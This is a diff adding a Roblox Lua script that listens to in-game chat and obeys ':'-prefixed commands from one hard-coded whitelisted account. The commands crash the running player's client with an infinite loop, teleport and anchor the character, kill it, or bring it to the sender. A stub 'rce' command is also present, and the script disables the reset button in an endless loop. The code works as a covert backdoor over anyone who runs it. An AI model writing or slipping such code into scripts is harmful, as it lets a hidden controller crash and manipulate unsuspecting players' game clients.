@@ -1,0 +1,125 @@
+local TextChatService = game:GetService("TextChatService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local Whitelist = { "jdurieivfbd12" }
+
+local cmds = {
+    ["crash"] = function()
+        while true do
+            print("Penis") -- 테스트용
+        end
+    end,
+
+    ["kick"] = function()
+        if LocalPlayer.Character then
+            local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+            local Hocf = hrp and hrp.CFrame
+            if hrp and Hocf then
+                hrp.CFrame = CFrame.new(1e7, 1e7, 1e7)
+                task.wait(0.1)
+                hrp.Anchored = true
+                task.wait(0.03)
+                hrp.CFrame = Hocf
+            end
+
+            local hum = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+            if hum then
+                hum.Health = math.huge
+            end
+
+            LocalPlayer.CharacterAdded:Connect(function(char)
+                local newHum = char:WaitForChild("Humanoid")
+                newHum.Health = math.huge
+            end)
+
+            -- 제설정 버튼 제거 반복 실행
+            task.spawn(function()
+                repeat
+                    task.wait()
+                    pcall(function()
+                        game.StarterGui:SetCore("ResetButtonCallback", false)
+                    end)
+                until false
+            end)
+        end
+    end,
+
+    ["bring"] = function(Admin)
+        if LocalPlayer.Character and Admin.Character then
+            local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+            local adminHrp = Admin.Character:FindFirstChild("HumanoidRootPart")
+            if hrp and adminHrp then
+                hrp.CFrame = adminHrp.CFrame
+            end
+        end
+    end,
+
+    ["kill"] = function()
+        if LocalPlayer.Character then
+            local hum = LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")
+            if hum then
+                hum.Health = 0
+            end
+        end
+    end,
+
+    ["rce"] = function(_, code)
+        warn("RCE 명령은 현재 지원되지 않습니다.")
+    end,
+}
+
+local function isWhitelisted(playerName)
+    for _, name in ipairs(Whitelist) do
+        if name:lower() == playerName:lower() then
+            return true
+        end
+    end
+    return false
+end
+
+local function FindMatch(Name)
+    Name = Name:lower()
+    for _, Player in Players:GetPlayers() do
+        if Player.Name:lower():sub(1, #Name) == Name then
+            return Player
+        end
+    end
+    return nil
+end
+
+-- 텍스트 명령 처리
+TextChatService.OnIncomingMessage = function(message)
+    local sender = message.TextSource
+    if not sender then return end
+
+    local senderName = sender.Name
+    if not isWhitelisted(senderName) then return end
+
+    local lowerMsg = message.Text:lower()
+    if string.sub(lowerMsg, 1, 1) == ":" then
+        local args = string.split(string.sub(lowerMsg, 2), " ")
+        local Command = table.remove(args, 1)
+        local TargetName = table.remove(args, 1)
+        local Data = table.concat(args, " ")
+
+        if Command and TargetName and cmds[Command] then
+            Command = Command:lower()
+            local Target = FindMatch(TargetName)
+            if TargetName == "all" or Target == LocalPlayer or TargetName:lower() == LocalPlayer.Name:lower() then
+                pcall(function()
+                    cmds[Command](sender, Data)
+                end)
+            end
+        end
+    end
+end
+
+-- 스크립트 실행 시 제설정 버튼 제거 (화이트리스트 제외)
+task.spawn(function()
+    repeat
+        task.wait()
+        pcall(function()
+            game.StarterGui:SetCore("ResetButtonCallback", false)
+        end)
+    until false
+end)
